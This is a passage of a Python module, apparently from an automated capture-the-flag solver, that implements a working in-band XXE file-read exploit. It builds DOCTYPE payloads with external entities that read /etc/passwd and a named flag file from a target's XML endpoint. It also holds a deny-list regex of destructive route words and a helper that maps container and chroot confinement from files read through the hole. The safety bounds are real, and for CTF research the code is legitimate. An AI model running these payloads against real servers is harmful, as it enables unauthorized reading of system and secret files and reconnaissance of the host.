#!/usr/bin/env python3
"""Narrow, in-band XXE proof reader for web Layer 1.

This peer recognizes only an exact target-local XML-over-POST contract already
present in ``ctx['preloaded']``.  The contract may be supplied by ``/api/clues``
or by an OpenAPI requestBody whose only applicable operation is POST with an
XML media type.  It then performs one bounded validation sequence:

1. benign well-formed XML baseline;
2. ``file:///etc/passwd`` entity read, confirmed by passwd's own bytes;
3. an identically shaped nonexistent-file negative control;
4. one flag file named by the target-local prompt or metadata.

There is no OOB path, external HTTP entity, parameter entity, PHP wrapper,
schema/import fetch, or target-authored DTD.  Once an entity-bearing request is
sent the sequence is terminal: callers must not fall through to another
stateful peer.  Every request uses the caller's scope-locked ``WebClient`` (or a
compatible injected test client), and shares its deadline, request budget and
stop event.

Contract::

    solve(target, ctx=None) -> the event's payoff token | None  (ctf.flagfmt.payoff_kind)
    solve_targets(targets, ctx=None) -> {answer_id: proof | None}

The usual peer metadata is written to ``ctx['result_sink'][answer_id]``.
"""

from __future__ import annotations

import datetime as _dt
import json
import os
import posixpath
import re
import sys
import threading
import time
import urllib.parse
from pathlib import Path


# ctf package import (script runs need the checkout root on sys.path)
try:
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt, event as ctf_event
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[2]))
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt, event as ctf_event

HERE = Path(__file__).resolve().parent
_TK = HERE.parent / "toolkits"
if str(_TK) not in sys.path:
    sys.path.insert(0, str(_TK))
if str(HERE) not in sys.path:
    sys.path.insert(0, str(HERE))

import web as _web  # noqa: E402 -- the sole production transport/scope lock
import security_json as _security_json  # noqa: E402 -- fail-closed policy JSON

try:
    import forge_event as _proofs  # noqa: E402 -- shared proof novelty policy
except Exception:  # pragma: no cover - fail closed when laid out differently
    _proofs = None

BASELINE_INCOMPLETE = getattr(
    _proofs, "BASELINE_STRICT_INCOMPLETE",
    "<!-- csctf-baseline-strict-set:incomplete -->",
)


REQUEST_TIMEOUT = 8.0
DEFAULT_SECONDS = 30.0
DEFAULT_MAX_REQUESTS = 8
DEADLINE_PAD = 0.3
MAX_TEXT = 400_000
MAX_ROUTE_BYTES = 1024
MAX_BODY_BYTES = 16 * 1024
MAX_FILE_BYTES = 512

_XML_MEDIA = re.compile(r"(?i)(?:application|text)/(?:[A-Za-z0-9.+-]*\+)?xml(?:\s*;|$)")
# The event's payoff token in any case (a proof under a proof event, else a flag): ctf.flagfmt.
_PAYOFF_SEEN = flagfmt.PAYOFF_ANYCASE
_PASSWD_MARKER = re.compile(rb"(?<![A-Za-z0-9_.-])root:[^:\n<]{0,64}:0:0:[^\n]{0,256}:/")
_XML_NAME = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,63}$")
_ABS_PATH = re.compile(r"(?<![A-Za-z0-9:/])(/[A-Za-z0-9._+@%=-]+(?:/[A-Za-z0-9._+@%=-]+)+)")
_SAFE_FILE = re.compile(r"^/(?:[A-Za-z0-9._+@=-]+/)*[A-Za-z0-9._+@=-]+$")
_FLAG_FILE_WORD = re.compile(
    r"(?i)\b(?:(?:objective|flag_file|proof|flag|target)[ _-]?(?:file|path)|"
    r"(?:file|path)[ _-]?(?:for|containing|with)[ _-]?(?:the[ _-]?)?(?:objective|flag_file|proof|flag)|"
    r"mounted[ _-]?(?:file|path))\b"
)
# Accept both the Huntress ("objective_*") and CSCTF ("flag_*") clue keys; the
# CSCTF sed left a bogus "flag_file_file" (from renaming "objective_file"), which
# is dropped in favour of the real "objective_file"/"flag_file" keys.
_FLAG_FILE_KEYS = {
    "objective_path", "objective_file", "flag_file_path", "flag_path",
    "flag_file", "proof_path", "proof_file", "target_file", "file_path",
}
_METHOD_KEYS = ("xml_method", "request_method", "feature_method", "http_method", "method")
_MEDIA_KEYS = ("xml_content_type", "request_content_type", "content_type", "media_type")
_ROUTE_KEYS = ("xml_route", "parser_route", "parse_route", "document_route", "feature_route")
_ROOT_KEYS = ("xml_root", "root_element", "document_root")
_FIELD_KEYS = ("xml_field", "body_field", "document_field")
_CLUE_AUTHORITY_KEYS = frozenset(
    _METHOD_KEYS + _MEDIA_KEYS + _ROUTE_KEYS + _ROOT_KEYS + _FIELD_KEYS)

# Synthetic action words are not needed here.  An XML reader/parser route may
# inspect a document, but routes that alter durable/auth/account state are out.
_ROUTE_ACTION_BOUNDARY = r"[/_\-.?&=;,+ ]"
_ROUTE_ACTION_OBJECT = (
    r"(?:users?|accounts?|profiles?|passwords?|credentials?|tokens?|sessions?|jobs?|tasks?|"
    r"records?|items?|files?|resources?|orders?|payments?|funds|money|roles?|permissions?|"
    r"groups?|members?|webhooks?|keys?|data|databases?|db|caches?|state|services?|process(?:es)?|"
    r"systems?|instances?|projects?|organizations?|orgs?)"
)
_BLOCKED_ROUTE = re.compile(
    rf"(?i)(?:^|{_ROUTE_ACTION_BOUNDARY})(?:delete|destroy|drop|wipe|purge|remove|truncate|erase|reset|revoke|"
    r"logout|signout|disable|deactivate|uninstall|kill|shutdown|reboot|ban|suspend|cancel|"
    r"transfer|pay|purchase|register|login|signin|password|token|redeem|issue|upload|import|"
    rf"create|update|edit|write|save)(?=$|{_ROUTE_ACTION_BOUNDARY}|\d|"
    rf"{_ROUTE_ACTION_OBJECT}(?=$|{_ROUTE_ACTION_BOUNDARY}|\d))"
)


def enabled() -> bool:
    raw = ctf_env.get("CTF_WEB_XXE_READ")
    if raw is not None:
        return raw.strip().lower() in ("on", "1", "true", "yes")
    try:
        root = ctf_paths.workdir()
        return not (root / "_xxe_read.off").exists()
    except Exception:
        return False


def _snake(value) -> str:
    value = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", str(value or ""))
    return re.sub(r"[^a-z0-9]+", "_", value.lower()).strip("_")


def _origin(value):
    try:
        p = urllib.parse.urlsplit(str(value or ""))
        if p.scheme not in ("http", "https") or not p.hostname:
            return None
        return p.scheme, p.hostname.lower().rstrip("."), p.port or (443 if p.scheme == "https" else 80)
    except Exception:
        return None


def _response(raw):
    if not isinstance(raw, dict):
        return None
    if "body" in raw:
        return raw
    if "text" in raw:
        out = dict(raw)
        out["body"] = str(raw.get("text") or "").encode()
        return out
    return None


def _text(response) -> str:
    if not isinstance(response, dict):
        return ""
    if _proofs is not None and hasattr(_proofs, "response_text_views"):
        try:
            views = _proofs.response_text_views(response)
            return str(views[0])[:MAX_TEXT] if views else ""
        except Exception:
            return ""
    value = response.get("body", response.get("text", ""))
    if isinstance(value, (bytes, bytearray)):
        return bytes(value[:MAX_TEXT]).decode("utf-8", "replace")
    return str(value or "")[:MAX_TEXT]


def _baseline_text(response) -> str:
    if _proofs is not None and hasattr(_proofs, "response_baseline_text"):
        return _proofs.response_baseline_text(response)
    text = _text(response)
    raw = response.get("response_headers", response.get("headers", {})) if isinstance(response, dict) else {}
    headers = "\n".join(str(value)[:4096] for value in raw.values()) if isinstance(raw, dict) else ""
    return (text + (("\n" + headers) if headers else ""))[:MAX_TEXT]


def _json(response, *, strict=True):
    views = None
    if _proofs is not None and hasattr(_proofs, "response_text_views"):
        try:
            views = _proofs.response_text_views(response, strict=strict)
        except Exception:
            return None
    try:
        value = _security_json.loads_unique(
            views if views is not None else [_text(response)], max_chars=MAX_TEXT)
        return value if isinstance(value, dict) else None
    except Exception:
        return None


def _passwd_seen(response):
    """Search coherent response content, never container names or MIME headers."""
    if not isinstance(response, dict):
        return False
    if _proofs is not None and hasattr(_proofs, "response_text_views"):
        try:
            views = _proofs.response_text_views(response)
        except Exception:
            views = []
        return any(_PASSWD_MARKER.search(str(view).encode("utf-8", "replace")[:MAX_TEXT])
                   for view in list(views or [])[:256])
    headers = response.get("response_headers", response.get("headers", {}))
    names = {str(key).lower(): str(value).lower() for key, value in headers.items()} \
        if isinstance(headers, dict) else {}
    value = response.get("body", response.get("text", b""))
    data = value.encode("utf-8", "replace") if isinstance(value, str) else bytes(value or b"")
    ctype = names.get("content-type", "")
    if (names.get("content-encoding") or ctype.startswith("multipart/")
            or "zip" in ctype or "tar" in ctype
            or data.startswith((b"PK\x03\x04", b"\x1f\x8b"))):
        return False
    return bool(_PASSWD_MARKER.search(data[:MAX_TEXT]))


def _walk(value, path=(), depth=0):
    """Walk every node in JSON already bounded by ``security_json``."""
    stack = []
    if isinstance(value, dict):
        stack.extend((path + (str(key),), item)
                     for key, item in reversed(list(value.items())))
    elif isinstance(value, list):
        stack.extend((path + (str(index),), item)
                     for index, item in reversed(list(enumerate(value))))
    while stack:
        here, item = stack.pop()
        yield here, item
        if isinstance(item, dict):
            stack.extend((here + (str(key),), child)
                         for key, child in reversed(list(item.items())))
        elif isinstance(item, list):
            stack.extend((here + (str(index),), child)
                         for index, child in reversed(list(enumerate(item))))


def _safe_route(value, base_url):
    try:
        route = _web.safe_same_origin_route(
            value, base_url, allow_query=False, guard_query=True, max_bytes=MAX_ROUTE_BYTES)
        if route is None:
            return None
        path = urllib.parse.urlsplit(route).path or "/"
        if any(ch in path for ch in "{}*"):
            return None
        layers = _web.canonical_route_layers(path, max_bytes=MAX_ROUTE_BYTES) or ()
        guarded_layers = []
        for layer in layers:
            guarded_layers.append(layer)
            guarded_layers.append(re.sub(r"([a-z0-9])([A-Z])", r"\1/\2", layer))
        if (any(_BLOCKED_ROUTE.search(layer) for layer in guarded_layers)
                or any(_web.route_has_destructive_action(layer) for layer in layers)):
            return None
        return route
    except Exception:
        return None


def _safe_file(value):
    if not isinstance(value, str):
        return None
    value = value.strip()
    # The path is interpolated inside a quoted DTD system identifier.  A broad
    # POSIX-path check is not sufficient here: quotes, entity/DTD delimiters,
    # brackets, semicolons and whitespace can change the document grammar.
    # Keep a deliberately conservative filesystem alphabet before doing any
    # normalization.  Percent escapes are refused rather than decoded.
    if (not value.startswith("/") or len(value) > MAX_FILE_BYTES or "\\" in value
            or "%" in value or "\x00" in value or "://" in value
            or not _SAFE_FILE.fullmatch(value)):
        return None
    try:
        decoded = urllib.parse.unquote(value)
    except Exception:
        return None
    if decoded != value or "//" in value or any(part in ("", ".", "..") for part in value.split("/")[1:]):
        return None
    normalized = posixpath.normpath(value)
    if normalized != value or not normalized.startswith("/"):
        return None
    return value


def _first_scalar(doc, keys):
    if not isinstance(doc, dict):
        return None
    for key in keys:
        value = doc.get(key)
        if isinstance(value, (str, int)) and not isinstance(value, bool):
            return value
    return None


_MISSING = object()
_CONFLICT = object()


def _coherent_scalar(doc, keys, normalizer):
    """One semantic value across every present alias, or a conflict sentinel."""
    if not isinstance(doc, dict):
        return _MISSING
    values = []
    for key in keys:
        if key not in doc:
            continue
        raw = doc.get(key)
        if not isinstance(raw, str):
            return _CONFLICT
        try:
            value = normalizer(raw)
        except Exception:
            return _CONFLICT
        if value is None:
            return _CONFLICT
        if value not in values:
            values.append(value)
    if not values:
        return _MISSING
    return values[0] if len(values) == 1 else _CONFLICT


def _oas_unauthenticated(document, operation):
    """OpenAPI operation is explicitly/effectively free of auth requirements."""
    if not isinstance(document, dict) or not isinstance(operation, dict):
        return False
    security = operation.get("security", _MISSING)
    if security is _MISSING:
        security = document.get("security", [])
    return isinstance(security, list) and not security


def _oas_parameter(document, value, seen=None):
    """Resolve one bounded local OpenAPI Parameter Object reference."""
    if not isinstance(value, dict):
        return None
    if "$ref" not in value:
        return value
    if set(value) != {"$ref"}:
        return None
    ref = value.get("$ref")
    if not isinstance(ref, str) or not ref.startswith("#/") or len(ref) > 512:
        return None
    seen = set(seen or ())
    if ref in seen or len(seen) >= 8:
        return None
    seen.add(ref)
    node = document
    try:
        for raw in ref[2:].split("/"):
            token = raw.replace("~1", "/").replace("~0", "~")
            if not isinstance(node, dict) or token not in node:
                return None
            node = node[token]
    except Exception:
        return None
    return _oas_parameter(document, node, seen)


def _preloaded_docs(preloaded, base_url):
    out = {}
    raw_keys = {}
    collided = set()
    items = list((preloaded or {}).items())
    if len(items) > 40:
        return {}
    for path, response in items:
        if not isinstance(path, str):
            continue
        route = _web.safe_preloaded_route_key(path, base_url, max_bytes=MAX_ROUTE_BYTES)
        if route is None or route in collided:
            continue
        if route in raw_keys and raw_keys[route] != path:
            out.pop(route, None)
            collided.add(route)
            continue
        raw_keys[route] = path
        normalized = _response(response)
        if (normalized is None or not isinstance(normalized.get("status"), int)
                or not 200 <= normalized["status"] < 300):
            continue
        # A clue/spec can authorize live POSTs.  Any malformed/truncated
        # carrier or unsafe sibling invalidates the whole authority document;
        # never salvage a valid-looking JSON leaf from a poisoned container.
        doc = _json(normalized, strict=True)
        if isinstance(doc, dict):
            out[route] = doc
    return out


def _schema_names(schema):
    """An explicit root plus exactly one scalar entity slot; otherwise no contract."""
    if not isinstance(schema, dict) or "$ref" in schema:
        return None
    xml = schema.get("xml") if isinstance(schema.get("xml"), dict) else {}
    root = xml.get("name") if isinstance(xml.get("name"), str) else None
    if root is None or not _XML_NAME.fullmatch(root):
        return None
    if schema.get("type") == "string":
        return root, None
    props = schema.get("properties") if isinstance(schema.get("properties"), dict) else {}
    required = schema.get("required") if isinstance(schema.get("required"), list) else []
    # A generated object cannot omit another required member. With no required list, only one string-like
    # property is an unambiguous place for the entity. Nested/array/composed schemas stay agent-directed.
    if required:
        if len(required) != 1:
            return None
        name = required[0]
        spec = props.get(name)
        candidates = [name] if (_XML_NAME.fullmatch(str(name)) and isinstance(spec, dict)
                                 and spec.get("type") in (None, "string")) else []
    else:
        candidates = [name for name, spec in props.items()
                      if _XML_NAME.fullmatch(str(name)) and isinstance(spec, dict)
                      and spec.get("type") in (None, "string")]
    return (root, str(candidates[0])) if len(candidates) == 1 else None


def _openapi_contract(doc, base_url, clue_route=None):
    if not isinstance(doc, dict) or not isinstance(doc.get("paths"), dict):
        return []
    out = []
    for raw_path, path_item in doc["paths"].items():
        route = _safe_route(raw_path, base_url)
        if route is None or (clue_route is not None and route != clue_route) or not isinstance(path_item, dict):
            continue
        operation = path_item.get("post")
        if not isinstance(operation, dict):
            continue
        if not _oas_unauthenticated(doc, operation):
            continue
        # Required path/query/header/cookie members would make our generated
        # request incomplete.  Refuse rather than invent a value.
        params = []
        invalid_parameters = False
        for owner in (path_item, operation):
            if "parameters" not in owner:
                continue
            rows = owner.get("parameters")
            if not isinstance(rows, list):
                invalid_parameters = True
                break
            for row in rows:
                resolved = _oas_parameter(doc, row)
                if not isinstance(resolved, dict):
                    invalid_parameters = True
                    break
                params.append(resolved)
            if invalid_parameters:
                break
        if invalid_parameters or any(p.get("required") is True for p in params):
            continue
        body = operation.get("requestBody")
        content = body.get("content") if isinstance(body, dict) and isinstance(body.get("content"), dict) else {}
        for media, description in content.items():
            if not isinstance(media, str) or not _XML_MEDIA.search(media):
                continue
            schema = description.get("schema") if isinstance(description, dict) else None
            names = _schema_names(schema)
            if names is None:
                continue
            root, field = names
            out.append({"route": route, "media": media, "root": root, "field": field,
                        "source": "openapi"})
    return out


def _clue_contract(clues, base_url):
    if not isinstance(clues, dict):
        return None
    method = _coherent_scalar(clues, _METHOD_KEYS, lambda value: value.strip().upper())
    media = _coherent_scalar(clues, _MEDIA_KEYS, lambda value: value.strip().lower())
    route = _coherent_scalar(clues, _ROUTE_KEYS,
                             lambda value: _safe_route(value, base_url))
    # Exact means all three facts are supplied; the word "XML" elsewhere in
    # prose cannot turn a generic feature route into POST authority.
    if route in (_MISSING, _CONFLICT) or method != "POST" \
            or media in (_MISSING, _CONFLICT) or not _XML_MEDIA.search(media):
        return None
    root_value = _coherent_scalar(clues, _ROOT_KEYS, lambda value: value.strip())
    field = _coherent_scalar(clues, _FIELD_KEYS, lambda value: value.strip())
    if (root_value in (_MISSING, _CONFLICT) or field in (_MISSING, _CONFLICT)
            or not _XML_NAME.fullmatch(root_value) or not _XML_NAME.fullmatch(field)):
        return None
    return {"route": route, "media": media, "root": root_value,
            "field": field, "source": "clues"}


def _contract(docs, base_url):
    clues = docs.get("/api/clues")
    clue_authority_present = (
        isinstance(clues, dict)
        and any(key in clues for key in _CLUE_AUTHORITY_KEYS)
    )
    clue = _clue_contract(clues, base_url)
    # XML-specific clue fields are target-local authority, including negative
    # authority. Do not ignore GET/JSON/malformed/partial clues and cross the
    # entity-POST boundary merely because an independent OpenAPI document
    # advertises a usable operation.
    if clue_authority_present and clue is None:
        return None
    api = []
    for path, doc in docs.items():
        if path.endswith(("openapi.json", "swagger.json", "api-docs")) or "openapi" in doc or "swagger" in doc:
            api += _openapi_contract(doc, base_url)
    unique = {}
    for item in api:
        key = (item["route"], item["media"].split(";", 1)[0].strip().lower(),
               item["root"], item["field"])
        unique[key] = item
    if clue:
        # A second complete authority source may corroborate the clue, but it
        # may not silently disagree on route, media type or XML shape.
        if not unique:
            return clue
        clue_key = (clue["route"], clue["media"].split(";", 1)[0].strip().lower(),
                    clue["root"], clue["field"])
        return clue if set(unique) == {clue_key} else None
    # Without clues, only one exact XML POST operation is unambiguous.
    return next(iter(unique.values())) if len(unique) == 1 else None


def _flag_file_file(docs, prompt):
    clue_values = []
    clues = docs.get("/api/clues") or {}
    for path, value in _walk(clues):
        if path and _snake(path[-1]) in _FLAG_FILE_KEYS:
            safe = _safe_file(value)
            if safe and safe != "/etc/passwd" and safe not in clue_values:
                clue_values.append(safe)
    if len(clue_values) == 1:
        return clue_values[0]
    if len(clue_values) > 1:
        return None
    text = str(prompt or "")[:40_000]
    values = []
    for match in _ABS_PATH.finditer(text):
        window = text[max(0, match.start() - 100):min(len(text), match.end() + 100)]
        safe = _safe_file(match.group(1))
        if safe and safe != "/etc/passwd" and _FLAG_FILE_WORD.search(window) and safe not in values:
            values.append(safe)
    return values[0] if len(values) == 1 else None


def _xml(root, field, content, *, entity=None, system=None):
    if not _XML_NAME.fullmatch(root) or (field is not None and not _XML_NAME.fullmatch(field)):
        raise ValueError("unsafe XML name")
    if entity is None:
        inner = content
        prefix = '<?xml version="1.0" encoding="UTF-8"?>'
    else:
        if not _XML_NAME.fullmatch(entity) or _safe_file(system) is None:
            raise ValueError("unsafe local entity")
        prefix = ('<?xml version="1.0" encoding="UTF-8"?>'
                  f'<!DOCTYPE {root} [<!ENTITY {entity} SYSTEM "file://{system}">]>')
        inner = f"&{entity};"
    body = f"{prefix}<{root}>" + (f"<{field}>{inner}</{field}>" if field else inner) + f"</{root}>"
    if len(body.encode()) > MAX_BODY_BYTES or "http://" in body or "https://" in body or "php://" in body:
        raise ValueError("unsafe XML body")
    return body


class _Runner:
    def __init__(self, target, ctx):
        self.target = dict(target) if isinstance(target, dict) else {"url": str(target)}
        self.url = str(self.target.get("url") or "")
        self.ctx = dict(ctx or {})
        try:
            self.deadline = float(self.ctx["deadline"]) if self.ctx.get("deadline") is not None \
                else time.time() + DEFAULT_SECONDS
        except (TypeError, ValueError):
            self.deadline = time.time() + DEFAULT_SECONDS
        try:
            self.max_requests = max(0, int(self.ctx.get("max_requests", DEFAULT_MAX_REQUESTS)))
        except (TypeError, ValueError):
            self.max_requests = DEFAULT_MAX_REQUESTS
        self.external_stop = self.ctx.get("stop")
        self.preloaded = dict(self.ctx.get("preloaded") or {})
        supplied_baselines = list(self.ctx.get("baseline_texts") or [])
        self.baselines = [str(value or "")[:MAX_TEXT]
                          for value in supplied_baselines[:60]]
        preloaded_values = list(self.preloaded.values())
        if ((len(supplied_baselines) > 60 or len(preloaded_values) > 60)
                and BASELINE_INCOMPLETE not in self.baselines):
            self.baselines.append(BASELINE_INCOMPLETE)
        for response in preloaded_values[:60]:
            normalized = _response(response)
            if normalized is not None:
                self.baselines.append(_baseline_text(normalized))
        self.requests = 0
        self.posts = 0
        self.entity_requests = 0
        self.entity_started = False
        self.terminal = False
        self.success = False
        self.confirmed = False
        self.uuid4 = False
        self.candidates = []
        self.findings = []
        self.responses = []
        self.where = None
        self.stopped = None
        self.t0 = time.time()
        self._gate = threading.Lock()
        self._stopped = False
        self.client = None

    def _may_send(self):
        if self._stopped or (hasattr(self.external_stop, "is_set") and self.external_stop.is_set()):
            self.stopped = self.stopped or "stopped"
            return False
        if self.requests >= self.max_requests:
            self.stopped = self.stopped or "max_requests"
            return False
        if self.deadline is not None and self.deadline - time.time() <= DEADLINE_PAD:
            self.stopped = self.stopped or "deadline"
            return False
        return True

    def _client(self):
        if self.client is not None:
            return self.client
        wanted = _origin(self.url)
        if wanted is None:
            self.stopped = "invalid target origin"
            return None
        try:
            candidate = self.ctx.get("client")
            if candidate is None and callable(self.ctx.get("client_factory")):
                candidate = self.ctx["client_factory"](self.url, REQUEST_TIMEOUT)
            if candidate is None:
                candidate = _web.WebClient(self.url, timeout=REQUEST_TIMEOUT)
            if _origin(getattr(candidate, "base", None)) != wanted:
                self.stopped = "client scope mismatch"
                return None
            self.client = candidate
            return candidate
        except Exception as exc:
            self.stopped = f"no scoped client: {type(exc).__name__}"
            return None

    def stop_now(self):
        with self._gate:
            self._stopped = True

    def post(self, contract, body, role, *, entity=False):
        route = _safe_route(contract.get("route"), self.url)
        if route is None or len(body.encode()) > MAX_BODY_BYTES:
            self.stopped = self.stopped or "unsafe route/body"
            return None
        with self._gate:
            client = self._client()
            if client is None or not self._may_send():
                return None
            try:
                left = self.deadline - time.time() if self.deadline is not None else None
                client.timeout = REQUEST_TIMEOUT if left is None else max(0.2, min(REQUEST_TIMEOUT, left - 0.1))
            except Exception:
                pass
            self.requests += 1
            self.posts += 1
            if entity:
                self.entity_started = True
                self.entity_requests += 1
                self.terminal = True
            try:
                response = client.request(
                    "POST", route, data=body,
                    headers={"Content-Type": str(contract.get("media") or "application/xml")},
                    allow_redirects=False,
                )
            except Exception as exc:
                self.responses.append({"role": role, "path": route, "status": None,
                                       "error": type(exc).__name__})
                self.stopped = self.stopped or f"transport: {type(exc).__name__}"
                self._stopped = True
                return None
            response = _response(response)
            self.responses.append({"role": role, "path": route,
                                   "status": response.get("status") if response else None})
            return response

    def run(self):
        if not enabled():
            self.stopped = "off"
            return None
        if _proofs is None:
            self.stopped = "shared proof classifier unavailable"
            return None
        docs = _preloaded_docs(self.preloaded, self.url)
        contract = _contract(docs, self.url)
        if contract is None:
            self.stopped = "no exact XML POST contract"
            return None
        route_allowed = self.ctx.get("route_allowed")
        if callable(route_allowed):
            try:
                if not route_allowed(contract["route"]):
                    self.stopped = "caller route policy refused XML route"
                    return None
            except Exception:
                self.stopped = "caller route policy failed closed"
                return None
        flag_file = _flag_file_file(docs, self.ctx.get("prompt"))
        if flag_file is None:
            self.stopped = "no unique clue/prompt flag_file file"
            return None
        # Do not begin a terminal entity sequence unless its complete four-call
        # budget fits and the shared stop/deadline gate is presently open.
        if self.max_requests - self.requests < 4 or not self._may_send():
            self.stopped = self.stopped or "insufficient budget for XXE sequence"
            return None
        if self._client() is None:
            return None
        root, field = contract.get("root") or "request", contract.get("field")
        baseline = self.post(contract, _xml(root, field, f"{ctf_event.current().slug}-xxe-baseline"), "baseline")
        if (baseline is None or not isinstance(baseline.get("status"), int)
                or not 200 <= baseline["status"] < 300
                or _proofs.rejection_signal(baseline)):
            self.stopped = self.stopped or "benign XML baseline failed"
            return None
        self.baselines.append(_baseline_text(baseline))
        if _passwd_seen(baseline):
            self.stopped = "benign XML baseline already contained passwd marker"
            return None

        passwd = self.post(contract, _xml(root, field, "", entity="xxe", system="/etc/passwd"),
                           "passwd-marker", entity=True)
        if passwd is None:
            self.stopped = self.stopped or "passwd marker request failed"
            return None
        if not _passwd_seen(passwd):
            self.baselines.append(_baseline_text(passwd))
            self.findings.append({"class": "xxe", "confirmed": False,
                                  "evidence": "passwd-marker-missing", "path": contract["route"]})
            self.stopped = "XXE passwd marker did not confirm"
            return None
        absent_path = f"/etc/{ctf_event.current().slug}_absent_" + os.urandom(6).hex() + ".nope"
        absent = self.post(contract, _xml(root, field, "", entity="xxe", system=absent_path),
                           "negative-control", entity=True)
        if absent is None:
            self.stopped = self.stopped or "negative control failed"
            return None
        negative_hit = _passwd_seen(absent)
        self.baselines.extend((_baseline_text(passwd), _baseline_text(absent)))
        if negative_hit:
            self.findings.append({"class": "xxe", "confirmed": False,
                                  "evidence": "marker-control-failed", "path": contract["route"]})
            self.stopped = "XXE marker/negative control did not confirm"
            return None
        self.confirmed = True
        self.findings.append({"class": "xxe", "confirmed": True, "evidence": "in_band_file_entity",
                              "path": contract["route"], "flag_file": flag_file})

        payoff = self.post(contract, _xml(root, field, "", entity="xxe", system=flag_file),
                           "flag_file", entity=True)
        self.where = "xxe-in-band"
        if payoff is None:
            self.stopped = self.stopped or "flag_file read failed"
            return None
        outcome = _proofs.extract_success(
            payoff, self.baselines, host=urllib.parse.urlsplit(self.url).hostname)
        self.success = bool(outcome.get("success"))
        self.uuid4 = bool(outcome.get("uuid4"))
        self.candidates = list(outcome.get("candidates") or [])
        if outcome.get("auto") is None:
            self.candidates += [value for value in outcome.get("wire") or []
                                if value not in self.candidates]
        if outcome.get("auto"):
            return outcome["auto"]
        self.stopped = "XXE confirmed; flag_file response had no unique proof"
        return None

    def summary(self, proof):
        return {"proof": proof, "class": "xxe", "success": self.success,
                "confirmed": self.confirmed, "terminal": self.terminal,
                "candidates": list(dict.fromkeys(self.candidates))[:12], "uuid4": self.uuid4,
                "baseline_incomplete": (_proofs.baseline_set_incomplete(self.baselines)
                                        if _proofs is not None
                                        and hasattr(_proofs, "baseline_set_incomplete") else True),
                "baseline_proofs": list(dict.fromkeys(
                    match.group(0) for text in self.baselines
                    for match in _PAYOFF_SEEN.finditer(str(text or ""))
                ))[:24],
                "requests": self.requests, "posts": self.posts,
                "entity_requests": self.entity_requests,
                "seconds": round(time.time() - self.t0, 3), "where": self.where,
                "stopped": self.stopped, "findings": self.findings[:8],
                "responses": self.responses[:12]}


def _surface(runner, ctx):
    evidence = ctx.get("evidence") if isinstance(ctx, dict) else None
    if not isinstance(evidence, list):
        return
    aid = runner.target.get("answer_id") or "target"
    for value in list(dict.fromkeys(runner.candidates))[:6]:
        line = _web.safe_display_text(
            f"WEB XXE CANDIDATE {aid}: {value} (confirmed flag_file read; not auto-submitted)", 600)
        if line not in evidence:
            evidence.append(line)


# --- Offline XXE traversal/confinement mapping -------------------------------
# Pure, deterministic, I/O-free analysis of file-read observations already
# captured by a confirmed XXE primitive (this reader, the inert catalog, or a
# manual probe).  It maps *where* reads are confined -- a container, a
# chroot/jail, or an unconfined host filesystem -- by reading the captured bytes
# as data only (line/field shape tests; never deserialized or executed).
MAP_MAX_OBSERVATIONS = 256
MAP_MAX_SCAN = 64 * 1024
# Container detection reads structure, not bare substrings: a host that merely
# runs Docker has "docker" all over its mountinfo (/var/lib/docker/overlay2/...)
# and its daemon's cgroup (/system.slice/docker.service), so only shapes that a
# process INSIDE a container sees are counted:
#   cgroup   -- a child of a "docker" or "lxc" segment, or a "docker-<id>.scope",
#               "libpod-<id>", "cri-containerd-<id>.scope", "kubepods*" or
#               "lxc.payload.*" segment;
#   mountinfo -- the row mounted at "/" is an overlay filesystem, or
#               /etc/hostname|hosts|resolv.conf is bind-mounted from a runtime's
#               per-container directory;
#   environ  -- KUBERNETES_SERVICE_HOST, or the "container=<runtime>" variable.
# Only reads of */cgroup, */mountinfo and */environ are examined.
_HEX_ID = r"[0-9a-f]{12,64}"
_CGROUP_SEGMENT_RULES = (
    ("kubernetes", re.compile(r"^kubepods(?:[.\-_].*)?$")),
    ("docker", re.compile(rf"^docker-{_HEX_ID}\.scope$")),
    ("podman", re.compile(rf"^libpod-(?:conmon-)?{_HEX_ID}(?:\.scope)?$")),
    ("containerd", re.compile(rf"^cri-containerd-{_HEX_ID}\.scope$")),
    ("lxc", re.compile(r"^lxc\.payload[.\-_].+$")),
)
# A container sits UNDER the runtime's parent group ("/docker/<id>",
# "/docker/buildkit/<id>", "/lxc/<name>"); no host process lives there, and the
# bare parent ("/docker") on its own proves nothing.
_CGROUP_PARENT_RULES = (  # (runtime, parent segment)
    ("docker", "docker"),
    ("lxc", "lxc"),
)
_BIND_MOUNT_POINTS = ("/etc/hostname", "/etc/hosts", "/etc/resolv.conf")
_BIND_ROOT_RULES = (  # runtime per-container directories seen in a bind's root field
    ("kubernetes", "/kubelet/pods/"),
    ("docker", "/docker/containers/"),
    ("podman", "/containers/storage/"),
    ("containerd", "/io.containerd."),
)
_OVERLAY_RUNTIME_RULES = (  # lowerdir/upperdir locations in an overlay root's options
    ("docker", "/docker/overlay2/"),
    ("podman", "/containers/storage/overlay"),
    ("containerd", "/io.containerd.snapshotter"),
)
_RUNTIME_PRIORITY = ("kubernetes", "docker", "podman", "containerd", "lxc")


_INIT_ROOT_PREFIX = "/proc/1/root/"


def _mountinfo_unescape(field: str) -> str:
    # mountinfo octal-escapes space, tab, newline and backslash as \ooo.
    return re.sub(r"\\([0-7]{3})", lambda m: chr(int(m.group(1), 8)), field)


def _mountinfo_rows(text: str):
    """Parse a mountinfo dump into [(root, mount_point, fstype, super_options)].

    Line shape: ``id parent maj:min root mount-point options [optional...] -
    fstype source super-options``.  Lines that do not have that shape are
    skipped; fstype/super_options are None when the separator is missing.
    """
    rows = []
    for line in text.splitlines():
        fields = line.split()
        if len(fields) < 6 or ":" not in fields[2]:
            continue
        fstype = super_options = None
        tail = fields[6:]
        if "-" in tail:
            after = tail[tail.index("-") + 1:]
            fstype = after[0] if after else None
            super_options = after[2] if len(after) > 2 else None
        rows.append((_mountinfo_unescape(fields[3]), _mountinfo_unescape(fields[4]),
                     fstype, super_options))
    return rows


def _mountinfo_root_mount(rows):
    """(root, fstype, super_options) of the mount visible at "/", or None.

    Later rows stack on earlier ones, so the last row mounted at "/" wins.
    """
    found = None
    for root, mount_point, fstype, super_options in rows:
        if mount_point == "/":
            found = (root, fstype, super_options)
    return found


def _cgroup_runtime(text: str):
    for line in text.splitlines():
        parts = line.split(":", 2)
        if len(parts) != 3:
            continue
